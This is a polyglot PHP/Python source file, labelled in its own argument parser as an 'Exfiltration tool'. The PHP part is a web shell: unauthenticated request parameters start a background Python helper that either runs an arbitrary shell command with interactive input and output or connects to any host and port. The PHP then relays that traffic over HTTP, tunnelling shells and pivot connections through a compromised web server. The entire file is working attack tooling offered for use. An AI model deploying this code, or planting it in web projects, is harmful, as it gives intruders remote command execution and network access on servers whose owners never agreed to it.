'''<?php
ob_end_clean();

# note, on windows it should be possible to use the "start" command
# to drive python into background.

# requires:
#  * allow_url_fopen enabled (it is by default)
#  * python2 or 3
#  * php

function error($msg) {
    http_response_code(403);
    header('Content-Type: application/json');
    echo "{\"error\": \"$msg\"}";
    exit();
}

if (!array_key_exists("action", $_GET)) {
    error('no action');
}

if (ini_get ("allow_url_fopen") !== "1") {
    error('allow_url_fopen not set');
}

if (!array_key_exists("port", $_GET)) {
    if (!array_key_exists("param", $_GET)) {
        error('missing param');
    }
    $port = rand(49152,65535);
    switch ($_GET["action"]) {
    case "cmd":
    case "connect":
        break;
    default:
        error('unexpected action');
    }

    $cmd = "python3 " . __FILE__ . " $port " .
         " --" . $_GET["action"] . " " . escapeshellarg($_GET["param"]) . " &";
    $x = array();
    # the close/open is required to ensure it goes into background
    proc_close(proc_open($cmd, $x, $x));

    for ($i = 0; $i < 10; $i++) {
        if (file_get_contents("http://127.0.0.1:$port/check") !== FALSE) {
            break;
        }
        sleep(1);
    }
    if ($i >= 10) {
        error('failed self check');
    }

    http_response_code(200);
    header('Content-Type: application/json');
    echo "{\"port\": $port}";
    exit();
}

$port = (int)$_GET["port"];

switch ($_GET["action"]) {
case "read":
    $ctx = stream_context_create(
        array(
            'http' => array(
                'timeout' => -1 # infinite
            )
        )
    );
    $data = file_get_contents("http://127.0.0.1:$port/read", FALSE, $ctx);
    if ($data === FALSE) {
        error('read failed');
    }
    $status = explode(' ', $http_response_header[0])[1];
    if ($status == 204) {
        http_response_code(200);
        header('Content-Type: application/json');
        echo '{"error": "timeout"}';
    } else {
        http_response_code(200);
        header('Content-Type: application/octet-stream');
        echo $data;
    }
    break;
case "write":
    $data = file_get_contents('php://input');
    $ctx = stream_context_create(
        array(
            'http' => array(
                'method'  => 'POST',
                'header'  => "Content-Type: application/octet-stream\r\n",
                'content' => $data,
                'timeout' => 10
            )
        )
    );
    if (file_get_contents("http://127.0.0.1:$port/write",
                          false,
                          $ctx) === FALSE) {
        error('write failed');
    }
    http_response_code(200);
    header('Content-Type: application/json');
    echo '{"error": null}';
    break;
case "shutdown":
    file_get_contents("http://127.0.0.1:$port/shutdown");
    http_response_code(200);
    header('Content-Type: application/json');
    echo '{"error": null}';
    break;
default:
    error('unexpected action');
}

exit();
?>
'''

# designed for python3, but works with python2

import argparse
import sys
import socket
import subprocess
import threading
import os
import time
from select import select

timeout = 5 # seconds

try:
    from http.server import BaseHTTPRequestHandler
    from socketserver import ThreadingTCPServer
except:
    from BaseHTTPServer import BaseHTTPRequestHandler
    from SocketServer import ThreadingTCPServer

parser = argparse.ArgumentParser(description='Exfiltration tool.')
parser.add_argument('port', metavar='N', type=int,
                    help='port to listen on')
parser.add_argument('--connect', metavar='HOST',
                    help='host and port to conenct to')
parser.add_argument('--cmd', metavar='CMD',
                    help='command to execute')
args = parser.parse_args()

if (not args.connect and not args.cmd) \
   or (args.connect and args.cmd):
    print('connect or cmd option must be given')
    sys.exit(1)

if args.connect:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host, port = args.connect.split(':', 1)
    sock.connect((host, int(port)))
else:
    # directly use os pipes to avoid python buffering
    stdin_r, stdin_w = os.pipe()
    stdout_r, stdout_w = os.pipe()
    proc = subprocess.Popen(
        [args.cmd],
        stdin=stdin_r,
        stdout=stdout_w,
        stderr=stdout_w,
        shell=True,
    )
    def clean_proc():
        proc.wait()
        os.close(stdin_r)
        os.close(stdin_w)
        os.close(stdout_w)
        # allow a small time to read any remaining data in buffer
        time.sleep(5)
        os.close(stdout_r)
    threading.Thread(target=clean_proc).start()

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/write':
            self.write()
        else:
            self.send_response(404)
            self.end_headers()

    def do_GET(self):
        if self.path == '/read':
            self.read()
        elif self.path == '/shutdown':
            self.shutdown()
        elif self.path == '/check':
            self.send_response(200)
            self.send_header('Content-Length', 2)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'OK')
        else:
            self.send_response(404)
            self.end_headers()

class SockHandler(Handler):
    def read(self):
        rlist,wlist,xlist = select([sock.fileno()], [], [], timeout)
        if rlist:
            data = sock.recv(65535)
            if len(data) == 0:
                self.send_response(404)
                self.end_headers()
                return
            self.send_response(200)
            self.send_header('Content-Length', len(data))
            self.send_header('Content-Type', 'application/octet-stream')
            self.end_headers()
            self.wfile.write(data)
        else:
            self.send_response(204)
            self.end_headers()

    def write(self):
        if hasattr(self.headers, 'getheader'):
            l = int(self.headers.getheader('content-length', 0))
        else:
            l = int(self.headers.get('Content-Length'))
        data = self.rfile.read(l)
        sock.send(data)
        self.send_response(204)
        self.end_headers()

    def shutdown(self):
        try:
            s.shutdown(socket.SHUT_RDWR)
            s.close()
        except:
            pass
        self.server.shutdown()
        print('shutdown ok')

class ProcHandler(Handler):
    def read(self):
        try:
            # probaby select does not work on windows, maybe should
            # make this conditional on os
            rlist,wlist,xlist = select([stdout_r], [], [], timeout)
            if rlist:
                data = os.read(stdout_r, 65535)
                self.send_response(200)
                self.send_header('Content-Length', len(data))
                self.send_header('Content-Type', 'application/octet-stream')
                self.end_headers()
                self.wfile.write(data)
            else:
                self.send_response(204)
                self.end_headers()
        except OSError:
            self.send_response(404)
            self.end_headers()

    def write(self):
        if hasattr(self.headers, 'getheader'):
            l = int(self.headers.getheader('content-length', 0))
        else:
            l = int(self.headers.get('Content-Length'))
        data = self.rfile.read(l)
        try:
            os.write(stdin_w, data)
            self.send_response(204)
        except OSError:
            self.send_response(404)
        self.end_headers()

    def shutdown(self):
        try:
            proc.kill()
        except:
            pass
        self.server.shutdown()
        print('shutdown ok')

class ReuseTCPServer(ThreadingTCPServer):
    allow_reuse_address = True

if args.connect:
    Handler = SockHandler
else:
    Handler = ProcHandler

httpd = ReuseTCPServer(("127.0.0.1", args.port), Handler)
print("serving at port", args.port)
httpd.serve_forever()
